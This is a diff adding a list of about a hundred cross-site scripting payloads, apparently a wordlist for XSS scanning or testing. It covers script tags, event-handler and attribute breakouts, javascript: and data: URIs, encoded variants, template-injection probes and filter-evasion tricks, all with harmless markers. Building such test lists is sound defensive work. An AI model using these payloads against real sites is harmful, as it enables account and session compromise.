@@ -1,0 +1,100 @@
+<script>document.title='xss:1337'</script>
+<script>console.log('xss:'+document.domain)</script>
+<script>document.body.insertAdjacentText('afterbegin','XSS:'+document.domain)</script>
+<img src=x onerror="this.outerHTML='XSS:'+document.domain">
+<svg onload="document.body.setAttribute('data-xss','ok')"></svg>
+<svg/onload="document.body.append('XSS')">
+<svg><animate onbegin="document.body.append('XSS')"></animate></svg>
+<details open ontoggle="document.body.append('XSS')"></details>
+<marquee onstart="document.body.append('XSS')"></marquee>
+<video onerror="document.body.append('XSS')"></video>
+" onmouseover="document.body.append('XSS')" x="
+' onmouseover="document.body.append('XSS')" x='
+" autofocus onfocus="document.body.append('XSS')" x="
+'><svg onload="document.body.append('XSS')">
+"/><svg onload="document.body.append('XSS')">
+javascript:/*x*/document.body.append('XSS')
+data:text/html,<script>document.body.append('XSS')</script>
+//example.com/%0Ajavascript:document.body.append('XSS')
+<button onclick="document.body.append('XSS')">click</button>
+<a href=# onclick="document.body.append('XSS')">x</a>
+</script><script>document.body.append('XSS')</script>
+';document.body.append('XSS');//
+";document.body.append('XSS');//
+`;document.body.append('XSS')//
+"}];document.body.append('XSS');//
+%3Cscript%3Edocument.body.append(%27XSS%27)%3C%2Fscript%3E
+%3Csvg%20onload%3Ddocument.body.append('XSS')%3E
+&lt;img src=x onerror=&quot;document.body.append('XSS')&quot;&gt;
+&lt;svg onload=&quot;document.body.append('XSS')&quot;&gt;
+jaVasCript:/*-*/document.body.append('XSS')
+data:text/html;base64,PHNjcmlwdD5kb2N1bWVudC5ib2R5LmFwcGVuZCgnWFNTJyk8L3NjcmlwdD4=
+<script>window.name='XSS:'+document.domain</script>
+<svg onload=top.postMessage('XSS:'+document.domain,'*')>
+<img src=x onerror=top.postMessage('XSS:'+location.host,'*')>
+__XSS_DOM_TEST__
+<script>/*sink-probe*/location.hash='#xss';document.body.append('XSS')</script>
+" oninput="document.body.append('XSS')" x="
+<svg><desc>safe</desc><script>document.body.append('XSS')</script></svg>
+<math><mtext></mtext><script>document.body.append('XSS')</script></math>
+<svg><foreignObject><script>document.body.append('XSS')</script></foreignObject></svg>
+<iframe src="javascript:parent.document.body.append('XSS')"></iframe>
+<img src=x onerror=alert?.call?.(null,1337)>
+<svg onload="document.body.append(String(Date.now()).slice(-4))">
+<svg οnlοad=document.body.append('XSS')>
+'><img src=x onerror="document.body.append('XSS')">
+";document.body.append(String(document.domain));var a="
+${document.body.append('XSS')}
+{{constructor.constructor('document.body.append(\'XSS\')')()}}
+{{=document.body.append('XSS')}}
+{{(1).toString().constructor('document.body.append(\'XSS\')')()}}
+{{ $emit && $emit('x') && 'XSS' }}
+" dangerouslySetInnerHTML={{__html:'XSS'}} "
+')};document.body.append('XSS');//
+");document.body.append('XSS');//
+`)};document.body.append('XSS')//
+<input onfocus="document.body.append('XSS')" autofocus>
+<input onblur="document.body.append('XSS')" autofocus>
+<div onmouseenter="document.body.append('XSS')">x</div>
+<svg><set attributeName=x onbegin="document.body.append('XSS')"></svg>
+javascript:top.postMessage('XSS:'+document.domain,'*')
+<script>new MutationObserver(()=>document.body.append('XSS')).observe(document.body,{childList:true})</script>
+<base href=//example.com/><script>parent.postMessage('XSS','*')</script>
+<object data="data:text/html,<script>top.postMessage('XSS','*')</script>"></object>
+<iframe srcdoc="<script>parent.postMessage('XSS','*')<\/script>"></iframe>
+<body onload="document.body.append('XSS')">
+XSS<probe>[test]{ok}
+\"<svg onload=document.body.append('XSS')>
+%22%3E%3Csvg%20onload%3Ddocument.body.append('XSS')%3E
+%27);document.body.append(%27XSS%27);//
+#%3Cscript%3Edocument.body.append('XSS')%3C/script%3E
+/%3Cscript%3Edocument.body.append('XSS')%3C/script%3E
+--><script>document.body.append('XSS')</script>
+<noscript onload="document.body.append('XSS')"></noscript>
+<meta http-equiv=refresh content="0;url=javascript:top.postMessage('XSS','*')">
+<img src=invalid onerror=document.body.append('XSS')>
+<object onerror="document.body.append('XSS')"></object>
+<svg
+onload=document.body.append('XSS')>
+<div draggable=true ondragstart="document.body.append('XSS')">
+<form action="javascript:document.body.append('XSS')"><input type=submit></form>
+<button formAction="javascript:document.body.append('XSS')">go</button>
+<svg><a xlink:href="javascript:top.postMessage('XSS','*')">x</a></svg>
+background-image:url("javascript:document.body.append('XSS')")
+style="width:expression(alert(1))"
+<svg onload="document.documentElement.dataset.xss=document.domain">
+<svg onload="setTimeout(()=>document.body.append('XSS'),0)">
+<svg onload="Function('document.body.append(\'XSS\')')()">
+javascript:void(document.body.append('XSS'))
+<script>window['doc'+'ument'].body.append('XSS')</script>
+<script>document.body.append('XSS')</script>
+%00<script>document.body.append('XSS')</script>
+?q=%3Cscript%3Edocument.body.append('XSS')%3C%2Fscript%3E
+</title><script>document.body.append('XSS')</script>
+<img src=x onerror=console.log('XSS:'+location.origin)>
+<script>if(document.cookie!==undefined){document.body.append('XSS')}</script>
+<iframe onload="this.contentDocument.body.append('XSS')"></iframe>
+<input value="" oninvalid="document.body.append('XSS')" required>
+<select onchange="document.body.append('XSS')"><option>1</option></select>
+<svg><desc id=x></desc><script>document.body.append('XSS')</script></svg>
+&#x3C;script&#x3E;document.body.append('XSS')&#x3C;/script&#x3E;
